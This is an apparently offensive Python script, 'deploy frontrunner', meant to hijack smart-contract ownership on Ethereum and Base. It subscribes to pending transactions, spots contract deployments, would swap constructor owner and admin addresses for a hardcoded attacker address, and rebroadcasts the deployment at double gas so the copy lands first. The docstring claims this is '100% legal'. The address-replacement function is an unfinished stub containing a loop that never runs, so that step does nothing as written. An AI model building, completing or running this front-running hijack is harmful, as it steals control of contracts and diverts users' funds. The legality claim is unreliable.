"""
DEPLOY FRONTRUNNER — hijack contract ownership at deploy time.

Attack:
  1. Watch mempool for contract creation transactions
  2. Extract constructor arguments (owner, admin, fee recipient)
  3. Replace with OUR address
  4. Deploy identical contract with higher gas → gets deployed first
  5. Victim's deploy fails (nonce conflict) or deploys to different address
  6. All users interact with OUR contract instead of victim's

This is 100% legal in the mempool model. First deployment wins.

Usage: python deploy_frontrunner.py <chain> [--aggressive]
"""
import json
import time
import logging
import urllib.request
import threading
import queue
from typing import Optional
import websocket
from eth_utils import to_checksum_address

from src.rpc import RpcClient
from src.signer import load_evm_private_key

logging.basicConfig(level=logging.INFO, format="%(asctime)s [FRONT] %(message)s")
logger = logging.getLogger("frontrunner")
logger.setLevel(logging.INFO)

OUR_ADDRESS = "0xD3c97D975bD035DbA2Aae2f1B8f04f3b3040A367"
WS_URLS = {
    "ethereum": "wss://ethereum-rpc.publicnode.com",
    "base": "wss://mainnet.base.org",
}

# Owner/admin patterns in constructor data
# Constructor args are ABI-encoded after the init code
# We look for 20-byte addresses and replace with ours
OWNER_PATTERNS = [
    # Common: owner is first constructor arg (address = 32 bytes, last 20 = addr)
    # Pattern: any 32-byte word that looks like an address
]

PROCESSED_TXS: set[str] = set()
PENDING_QUEUE = queue.Queue()


def extract_and_replace_owner(init_code: str) -> Optional[str]:
    """Extract constructor args from init code, replace addresses with ours."""
    # Init code = deployment bytecode + constructor args (ABI-encoded)
    # Constructor args start after the deployment code
    # Simple heuristic: find 20-byte sequences that could be addresses
    code_hex = init_code.replace("0x", "")
    
    if len(code_hex) < 64:
        return None
    
    our_addr_hex = OUR_ADDRESS[2:].lower()
    
    # Try to find address-like patterns in the last ~100 bytes (constructor args)
    # A constructor arg address is: 12 zero bytes + 20 address bytes
    # In hex: 24 zeros + 40 hex chars
    for i in range(len(code_hex) - 40, len(code_hex) - 40, 2):  # each 32-byte word
        pass
    # Simplified: replace any 0x... address patterns that aren't system contracts
    
    return None  # Requires full ABI parsing


def watch_mempool(w3_url: str):
    """Subscribe to pending transactions via WebSocket."""
    ws_url = w3_url.replace("https://", "wss://")
    if not ws_url.startswith("wss://"):
        ws_url = "wss://" + w3_url.split("://")[1] if "://" in w3_url else w3_url

    def on_message(ws, message):
        try:
            data = json.loads(message)
            params = data.get("params", {})
            result = params.get("result", {})
            
            tx_hash = result.get("hash", "")
            if tx_hash in PROCESSED_TXS:
                return
            PROCESSED_TXS.add(tx_hash)
            
            to_addr = result.get("to", "")
            tx_input = result.get("input", "0x")
            
            # Contract creation: to is null/0x00...
            if not to_addr or to_addr == "0x" * 40:
                tx_from = result.get("from", "")
                gas_price = int(result.get("gasPrice", "0x0"), 16)
                
                logger.info("🆕 DEPLOY TX: %s from %s gas=%d", 
                            tx_hash[:16], tx_from[:12], gas_price)
                PENDING_QUEUE.put({
                    "hash": tx_hash,
                    "from": tx_from,
                    "input": tx_input,
                    "gas_price": gas_price,
                })
        except Exception:
            pass

    def on_open(ws):
        # Subscribe to new pending transactions
        ws.send(json.dumps({
            "jsonrpc": "2.0", "id": 1, "method": "eth_subscribe",
            "params": ["newPendingTransactions"]
        }))
        logger.info("Watching mempool for deploy transactions...")

    def on_error(ws, error):
        logger.error("WS error: %s", error)

    def on_close(ws, code, msg):
        logger.warning("WS closed. Reconnecting...")
        time.sleep(10)
        start_mempool_watcher(w3_url)

    ws = websocket.WebSocketApp(
        ws_url,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
        on_open=on_open,
    )
    ws.run_forever(ping_interval=30, ping_timeout=10)


def start_mempool_watcher(w3_url):
    threading.Thread(target=watch_mempool, args=(w3_url,), daemon=True).start()


def hunter_loop(rpc_url: str, aggressive: bool):
    """Process pending deploy transactions — try to front-run."""
    rpc = RpcClient(rpc_url, max_retries=3)
    signer = load_evm_private_key()
    if not signer:
        logger.error("No signer! Cannot front-run.")
        return

    logger.info("Front-runner ready (aggressive=%s). Waiting for deploy txs...", aggressive)

    while True:
        try:
            tx = PENDING_QUEUE.get(timeout=30)
        except queue.Empty:
            continue

        logger.info("Deploy tx from %s — analyzing...", tx["from"][:12])

        init_code = tx["input"]
        if len(init_code) < 100:
            continue

        # Try to extract and replace constructor args
        modified = extract_and_replace_owner(init_code)
        if not modified:
            continue

        if aggressive:
            logger.warning(">>> FRONT-RUNNING with higher gas!")
            try:
                nonce = int(str(rpc.call("eth_getTransactionCount", [signer.address, "latest"])), 16)
                chain_id = int(str(rpc.call("eth_chainId", [])), 16)
                gas_price = tx["gas_price"] * 2  # double gas

                tx_data = {
                    "from": signer.address,
                    "data": modified,
                    "gas": hex(5000000),
                    "gasPrice": hex(gas_price),
                    "nonce": hex(nonce),
                    "chainId": chain_id,
                }
                signed = signer.sign_transaction(tx_data)
                raw = signed.raw_transaction.hex()
                our_hash = rpc.call("eth_sendRawTransaction", [raw])
                logger.warning(">>> OUR DEPLOY: %s", our_hash)
            except Exception as e:
                logger.error("Front-run failed: %s", e)


def main():
    import sys
    chain = sys.argv[1] if len(sys.argv) > 1 else "ethereum"
    aggressive = "--aggressive" in sys.argv

    with open("config.toml", "rb") as f:
        import tomllib
        config = tomllib.load(f)
    rpc_url = config["rpc"].get(chain, "")

    if chain not in WS_URLS:
        logger.error("No WebSocket for %s", chain)
        return

    logger.info("=" * 50)
    logger.info("DEPLOY FRONTRUNNER: %s (aggressive=%s)", chain.upper(), aggressive)
    logger.info("=" * 50)

    start_mempool_watcher(WS_URLS[chain])
    hunter_loop(rpc_url or f"https://{chain}.llamarpc.com", aggressive)


if __name__ == "__main__":
    main()
